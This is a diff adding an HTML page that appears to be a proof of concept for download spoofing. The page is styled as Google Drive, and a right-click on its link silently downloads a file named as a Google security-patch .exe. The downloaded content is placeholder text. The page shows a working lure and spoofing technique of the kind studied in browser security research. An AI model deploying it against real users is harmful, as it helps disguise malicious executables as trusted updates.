@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Google Drive - Internal Preview</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        text-align: center;
+        padding-top: 50px;
+      }
+      .drive-link {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: bold;
+        padding: 10px;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+      }
+      #status {
+        margin-top: 20px;
+        color: #5f6368;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>DOWNLOAD UPDATE FROM GOOGLE</h2>
+
+    <a id="link" class="drive-link" href="https://google.com/">
+      Right Click and Open in Split View
+    </a>
+
+    <div id="status"></div>
+
+    <script>
+      const link = document.getElementById("link");
+      const status = document.getElementById("status");
+
+      link.addEventListener("contextmenu", function (event) {
+        // Triggering a fake background process after 4 seconds
+        status.innerText = "Synchronizing with Split View...";
+
+        setTimeout(function () {
+          // Spoofing the download
+          const fakeData = "This is a spoofed file content.";
+          const blob = new Blob([fakeData], {
+            type: "application/octet-stream",
+          });
+          const url = window.URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.style.display = "none";
+          a.href = url;
+          // The spoofed filename
+          a.download = "Google_Update_Security_Patch-1.0.exe";
+
+          document.body.appendChild(a);
+          a.click();
+
+          window.URL.revokeObjectURL(url);
+          status.innerText = "Update downloaded successfully.";
+        }, 4000);
+      });
+    </script>
+  </body>
+</html>
